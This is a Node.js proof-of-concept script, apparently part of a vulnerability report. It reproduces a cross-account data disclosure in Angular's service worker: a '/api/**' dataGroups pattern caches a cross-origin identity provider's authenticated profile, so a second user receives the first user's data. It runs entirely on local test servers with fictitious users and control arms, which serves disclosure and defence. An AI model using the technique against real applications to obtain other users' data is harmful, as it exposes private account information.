/**
 * Path-style `dataGroups` patterns match cross-origin request URLs.
 *
 * Runs the real `ngsw-worker.js` from npm in Chromium with a genuinely
 * registered service worker (navigator.serviceWorker.register). Cache Storage,
 * Vary matching and request interception all belong to the browser.
 *
 * SETUP
 *   application origin : http://localhost:PORT_A   (service worker registered here)
 *   identity provider  : http://127.0.0.1:PORT_B   (a DIFFERENT origin)
 *   ngsw-config        : dataGroups[{ urls:['/api/**'], strategy:'performance' }]
 *
 * The developer chose cache-first for THEIR OWN `/api/**`. They never configured
 * anything for the identity provider. The path-style pattern, compiled without
 * origin binding, silently extends that deliberate caching policy to a
 * third-party authenticated endpoint.
 *
 * TIMELINE
 *   T0  Alice signs in -> GET {IdP}/v2/api/profile   Authorization: Bearer ALICE
 *   T1  Alice signs out
 *   T2  Bob signs in on the same browser
 *       GET the SAME URL                             Authorization: Bearer BOB
 *
 * THREE ARMS — one variable changes at a time
 *   A  VULNERABLE  endpoint /v2/api/profile        (pattern matches)
 *   B  CONTROL     endpoint /v2/profile            (pattern does not match)
 *   C  BOUNDARY    /v2/api/profile + `Vary: Authorization` from the IdP
 *
 * Run:
 *   npm install
 *   node poc-f12.mjs [--shot evidence.png]
 */
import {createServer} from 'http';
import {readFileSync, globSync, existsSync} from 'fs';
import {createHash} from 'crypto';
import {join, dirname} from 'path';
import {pathToFileURL, fileURLToPath} from 'url';
import {createRequire} from 'module';

const HERE = dirname(fileURLToPath(import.meta.url));
const shotIndex = process.argv.indexOf('--shot');
const shot = shotIndex > 0 ? process.argv[shotIndex + 1] : null;
const explicit = process.argv[2] && !process.argv[2].startsWith('--') ? process.argv[2] : null;
const nodeModules = explicit ?? join(HERE, 'node_modules');
if (!existsSync(join(nodeModules, '@angular/service-worker'))) {
  console.error(
    `@angular/service-worker not found under ${nodeModules}.\n` +
      `Run \`npm install\` in this directory first, or pass a node_modules path.`,
  );
  process.exit(2);
}

const {chromium} = createRequire(join(nodeModules, 'x.js'))('playwright');
const swDir = join(nodeModules, '@angular/service-worker');
const pkg = JSON.parse(readFileSync(join(swDir, 'package.json'), 'utf8'));
const {Generator} = await import(pathToFileURL(join(swDir, 'fesm2022/config.mjs')).href);

// ------------------------------------------------------------- IdP server ---
// A different origin. Returns a profile per bearer token and counts how many
// times it is actually contacted.
let idpHits = 0;
let sendVary = false;
const PROFILES = {
  ALICE: {name: 'Alice', email: 'alice@example.com', role: 'admin'},
  BOB: {name: 'Bob', email: 'bob@example.com', role: 'viewer'},
};

const idpServer = createServer((req, res) => {
  const origin = req.headers.origin ?? '*';
  const cors = {
    'Access-Control-Allow-Origin': origin,
    'Access-Control-Allow-Headers': 'authorization,content-type',
    'Access-Control-Allow-Methods': 'GET,OPTIONS',
    'Access-Control-Max-Age': '0',
  };
  if (req.method === 'OPTIONS') {
    res.writeHead(204, cors);
    res.end();
    return;
  }
  const u = new URL(req.url, 'http://x');
  if (u.pathname === '/hits') {
    res.writeHead(200, {...cors, 'Content-Type': 'application/json'});
    res.end(JSON.stringify({hits: idpHits}));
    return;
  }
  if (u.pathname === '/v2/api/profile' || u.pathname === '/v2/profile') {
    idpHits++;
    const bearer = (req.headers.authorization ?? '').replace(/^Bearer\s+/i, '');
    const headers = {...cors, 'Content-Type': 'application/json', 'Cache-Control': 'no-store'};
    if (sendVary) headers['Vary'] = 'Authorization';
    res.writeHead(200, headers);
    res.end(JSON.stringify(PROFILES[bearer] ?? {name: 'anonymous', role: 'none'}));
    return;
  }
  res.writeHead(404, cors);
  res.end('not found');
});
await new Promise((r) => idpServer.listen(0, '127.0.0.1', r));
const IDP = `http://127.0.0.1:${idpServer.address().port}`;

// ---------------------------------------------- manifest from the Generator --
const INDEX = readFileSync(join(HERE, 'index-f12.html'), 'utf8');
const files = {'/index.html': INDEX};
const manifest = await new Generator(
  {
    list: async () => Object.keys(files),
    read: async (p) => files[p],
    hash: async (p) => createHash('sha1').update(Buffer.from(files[p], 'utf8')).digest('hex'),
    write: async () => {},
  },
  '/',
).process({
  index: '/index.html',
  assetGroups: [{name: 'app', installMode: 'prefetch', resources: {files: ['/index.html']}}],
  dataGroups: [
    {
      name: 'api',
      urls: ['/api/**'],
      cacheConfig: {strategy: 'performance', maxSize: 100, maxAge: '1d'},
    },
  ],
  navigationUrls: ['/**'],
});

// ------------------------------------------------------- application server --
const appServer = createServer((req, res) => {
  const u = new URL(req.url, 'http://x');
  if (u.pathname === '/ngsw-worker.js') {
    res.writeHead(200, {'Content-Type': 'text/javascript', 'Cache-Control': 'no-store'});
    res.end(readFileSync(join(swDir, 'ngsw-worker.js')));
    return;
  }
  if (u.pathname === '/ngsw.json') {
    res.writeHead(200, {'Content-Type': 'application/json', 'Cache-Control': 'no-store'});
    res.end(JSON.stringify(manifest));
    return;
  }
  if (u.pathname === '/index.html' || u.pathname === '/') {
    res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store'});
    res.end(INDEX);
    return;
  }
  res.writeHead(404, {'Content-Type': 'text/plain'});
  res.end('not found');
});
await new Promise((r) => appServer.listen(0, '127.0.0.1', r));
const APP = `http://localhost:${appServer.address().port}`;

// ------------------------------------------------------------------- arms ---
const CHROME = globSync('/opt/pw-browsers/chromium*/chrome-linux/chrome');
const line = '='.repeat(78);
console.log(line);
console.log('Path-style dataGroups patterns match cross-origin request URLs');
console.log(`@angular/service-worker@${pkg.version}, unmodified ngsw-worker.js from npm`);
console.log(line);
console.log(`\napplication origin : ${APP}`);
console.log(`identity provider  : ${IDP}   <- DIFFERENT ORIGIN`);
console.log(`dataGroup pattern  : ${JSON.stringify(manifest.dataGroups[0].patterns)}`);
console.log('strategy           : performance, maxAge 1d');

const summarise = (s) => (s === null ? 'NO MATCH' : s.length > 46 ? s.slice(0, 46) + '...' : s);

async function runArm({label, path, vary}) {
  sendVary = vary;
  const browser = await chromium.launch(CHROME.length ? {executablePath: CHROME[0]} : {});
  const ctx = await browser.newContext(); // clean Cache Storage + SW registration
  const page = await ctx.newPage();
  page.on('pageerror', (e) => console.error('   [pageerror]', e.message));

  await page.goto(APP + '/index.html', {waitUntil: 'load'});
  const ready = await page.evaluate(() => window.__registerSW());
  if (!ready.ok) {
    await browser.close();
    return {label, failed: ready.message};
  }

  const url = IDP + path;
  const before = (await (await fetch(IDP + '/hits')).json()).hits;

  const alice = await page.evaluate(([u]) => window.__request(u, 'ALICE'), [url]);
  const bob = await page.evaluate(([u]) => window.__request(u, 'BOB'), [url]);

  const after = (await (await fetch(IDP + '/hits')).json()).hits;
  const varyProbe = await page.evaluate(([u]) => window.__varyProbe(u), [url]);

  const cacheContents = await page.evaluate(async () => {
    const out = {};
    for (const name of await caches.keys()) {
      const cache = await caches.open(name);
      const urls = (await cache.keys()).map((r) => r.url);
      if (urls.length) out[name] = urls;
    }
    return out;
  });

  if (shot && label.startsWith('A')) {
    await page.evaluate(([a, b]) => window.__report(a, b), [alice, bob]);
    await page.screenshot({path: shot, fullPage: true});
  }

  await browser.close();
  return {
    label,
    url,
    alice,
    bob,
    idpHitsForProfile: after - before,
    cacheContents,
    varyProbe,
    leaked: bob.body === alice.body && alice.body.includes('Alice'),
  };
}

const results = [];
results.push(await runArm({label: 'A  VULNERABLE  /v2/api/profile (pattern matches)', path: '/v2/api/profile', vary: false}));
results.push(await runArm({label: 'B  CONTROL     /v2/profile (pattern does not match)', path: '/v2/profile', vary: false}));
results.push(await runArm({label: 'C  BOUNDARY    /v2/api/profile + Vary: Authorization', path: '/v2/api/profile', vary: true}));

for (const r of results) {
  console.log('\n' + line);
  console.log(r.label);
  console.log(line);
  if (r.failed) {
    console.log(`  FAILED: ${r.failed}`);
    continue;
  }
  console.log(`  URL                          ${r.url}`);
  console.log(`  T0 Alice (Bearer ALICE)      ${r.alice.body}`);
  console.log(`  T2 Bob   (Bearer BOB)        ${r.bob.body}`);
  console.log(`  IdP contacted for profile    ${r.idpHitsForProfile}x   (2 = normal, 1 = Bob from cache)`);
  const crossOrigin = Object.entries(r.cacheContents)
    .map(([n, urls]) => [n, urls.filter((x) => x.startsWith(IDP))])
    .filter(([, urls]) => urls.length);
  if (crossOrigin.length) {
    for (const [n, urls] of crossOrigin) {
      console.log(`  browser Cache Storage        ${n}`);
      for (const x of urls) console.log(`                               CROSS-ORIGIN ${x}`);
    }
  } else {
    console.log('  browser Cache Storage        (no IdP URL stored)');
  }
  for (const [n, v] of Object.entries(r.varyProbe ?? {})) {
    console.log(`  Cache.match(bobRequest) on ${n}:`);
    console.log(`     {ignoreVary:true}  (what ngsw uses) -> ${summarise(v.withIgnoreVaryTrue)}`);
    console.log(`     browser default    (honours Vary)   -> ${summarise(v.withBrowserDefault)}`);
  }
  console.log(`  => Bob received Alice's data? ${r.leaked ? '>>> YES — CROSS-ACCOUNT DISCLOSURE' : 'no'}`);
}

const [A, B, C] = results;
const confirmed = A.leaked && !B.leaked;
console.log('\n' + line);
if (confirmed) {
  console.log('CONFIRMED in Chromium with a genuinely registered service worker.');
  console.log('');
  console.log("  A  Bob received Alice's profile, email and role. The IdP was contacted");
  console.log(`     only ${A.idpHitsForProfile}x, so the server never had a chance to refuse Bob's request.`);
  console.log('  B  The same endpoint without "/api/" in its path is left alone by the');
  console.log('     service worker, and Bob received his own data.');
  console.log(`  C  The IdP sends \`Vary: Authorization\`, the correct server-side control.`);
  console.log(`     The disclosure ${C.leaked ? 'STILL HAPPENS' : 'does not happen'}.`);
  const v = Object.values(C.varyProbe ?? {})[0];
  if (v) {
    console.log('     Cause pinned on the same cache entry:');
    console.log(`       {ignoreVary:true} -> ${summarise(v.withIgnoreVaryTrue)}`);
    console.log(`       browser default   -> ${summarise(v.withBrowserDefault)}`);
    console.log('     See the separate ignoreVary report; it reproduces same-origin.');
  }
  console.log('');
  console.log('  The developer chose cache-first for THEIR OWN `/api/**`. They never');
  console.log('  configured anything for the identity provider. The path-style pattern,');
  console.log('  compiled without origin binding, extended that deliberate caching policy');
  console.log('  to a third-party authenticated endpoint.');
} else {
  console.log(`NOT confirmed (A.leaked=${A.leaked}, B.leaked=${B.leaked}).`);
}
console.log(line);
if (shot) console.log(`\nScreenshot (arm A): ${shot}`);

appServer.close();
idpServer.close();
process.exit(confirmed ? 0 : 1);
